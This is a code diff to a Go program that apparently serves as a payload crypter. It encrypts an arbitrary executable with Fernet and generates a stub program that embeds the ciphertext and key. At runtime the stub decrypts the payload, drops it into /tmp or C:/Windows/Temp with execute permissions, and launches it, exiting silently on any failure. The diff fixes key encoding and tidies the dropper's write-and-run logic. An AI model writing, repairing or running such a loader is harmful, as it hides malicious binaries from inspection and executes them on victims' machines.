@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"fmt"
 	"github.com/fernet/fernet-go"
 	"io/ioutil"
@@ -29,59 +30,74 @@ func encrypt(payload []byte, key *fernet.Key) (string, error) {
 	return string(token), nil
 }
 
+// Encode the key as a base64 string
+func encodeKey(key *fernet.Key) string {
+	return base64.StdEncoding.EncodeToString(key[:]) // Key is byte slice, no need for string conversion
+}
+
 // Create a new payload file with the encrypted token
-func createPayload(token string, key *fernet.Key, outputName string) error {
+func createPayload(token string, encodedKey string, outputName string) error {
 	payloadTemplate := `
 package main
 
 import (
+	"encoding/base64"
 	"github.com/fernet/fernet-go"
 	"io/ioutil"
 	"os"
 	"os/exec"
-    "runtime"
+	"runtime"
 )
+
+func decodeKey(key string) (*fernet.Key, error) {
+	// Decode the base64 encoded key back into bytes
+	decodedKey, err := base64.StdEncoding.DecodeString(key)
+	if err != nil {
+		return nil, err
+	}
+	// Decode the key into a *fernet.Key object
+	var keyObj fernet.Key
+	copy(keyObj[:], decodedKey) // Manually copy the decoded bytes into the fernet key struct
+	return &keyObj, nil
+}
 
 func main() {
 	token := "{{.Token}}"
 	key := "{{.Key}}"
 
-	decodedKey, err := fernet.DecodeKey(key)
+	// Decode the key using the decodeKey function
+	keyObj, err := decodeKey(key)
 	if err != nil {
 		os.Exit(1)
 	}
 
-	payload := fernet.VerifyAndDecrypt([]byte(token), 0, []*fernet.Key{decodedKey})
+	// Decrypt the payload
+	payload := fernet.VerifyAndDecrypt([]byte(token), 0, []*fernet.Key{keyObj})
 	if payload == nil {
 		os.Exit(1) // Exit if decryption failed
 	}
 
-    // If the os is windows, save the payload to C:/Windows/Temp
-    if runtime.GOOS == "windows" {
-        err = ioutil.WriteFile("C:/Windows/Temp/{{.OutputName}}", payload, 0755)
-        if err != nil {
-            os.Exit(1)
-        }
-    } else {
-        err = ioutil.WriteFile("/tmp/{{.OutputName}}", payload, 0755)
-        if err != nil {
-            os.Exit(1)
-        }
-    }
-	// Execute the decrypted payload
+	// Save the payload to the appropriate directory based on the OS
+	var outputPath string
+	if runtime.GOOS == "windows" {
+		outputPath = "C:/Windows/Temp/{{.OutputName}}"
+	} else {
+		outputPath = "/tmp/{{.OutputName}}"
+	}
 
-    if runtime.GOOS == "windows" {
-        cmd := exec.Command("C:/Windows/Temp/{{.OutputName}}")
-        if err := cmd.Start(); err != nil {
-            os.Exit(1)
-        }
-    } else {
-        cmd := exec.Command("/tmp/{{.OutputName}}")
-        if err := cmd.Start(); err != nil {
-            os.Exit(1)
-        }
-    }
+	// Write the payload to a file
+	err = ioutil.WriteFile(outputPath, payload, 0755)
+	if err != nil {
+		os.Exit(1)
+	}
+
+	// Execute the decrypted payload
+	cmd := exec.Command(outputPath)
+	if err := cmd.Start(); err != nil {
+		os.Exit(1)
+	}
 }
+
 `
 
 	t, err := template.New("payload").Parse(payloadTemplate)
@@ -95,7 +111,7 @@ func main() {
 		OutputName string
 	}{
 		Token:      token,
-		Key:        key.Encode(),
+		Key:        encodedKey, // Pass the base64 encoded key
 		OutputName: outputName,
 	}
 
@@ -128,6 +144,8 @@ func main() {
 		log.Fatal(err)
 	}
 
+	encodedKey := encodeKey(key) // Use the encoded key (string)
+
 	token, err := encrypt(payload, key)
 	if err != nil {
 		log.Fatal(err)
@@ -135,9 +153,10 @@ func main() {
 
 	outputName := filepath.Base(payloadPath)
 
-	if err := createPayload(token, key, outputName); err != nil {
+	if err := createPayload(token, encodedKey, outputName); err != nil {
 		log.Fatal(err)
 	}
 
 	fmt.Println("New payload created: new_payload.go")
 }
+
